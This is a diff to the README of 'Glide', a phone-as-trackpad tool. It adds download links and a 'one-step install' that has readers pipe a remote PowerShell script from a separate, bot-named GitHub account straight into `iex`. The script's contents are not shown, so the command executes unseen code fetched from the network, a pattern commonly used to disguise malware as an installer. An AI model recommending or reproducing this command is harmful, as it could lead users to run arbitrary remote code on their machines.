@@ -1,5 +1,14 @@
 # Glide: your phone as a trackpad
 
+**Download page:** https://venkateshwaryamki-bot.github.io/glide/ ·
+**Installation guide:** https://venkateshwaryamki-bot.github.io/glide/guide.html
+
+**Windows one-step install** (paste into PowerShell):
+
+```
+irm https://raw.githubusercontent.com/venkateshwaryamki-bot/venkateshwaryamki-bot.github.io/main/glide/install.ps1 | iex
+```
+
 Glide turns your phone into a wireless trackpad, mouse, and keyboard for your laptop.
 It works on iPhone and Android with nothing to install on the phone. The laptop runs a
 small server, and the phone opens the trackpad in its browser over your Wi-Fi.
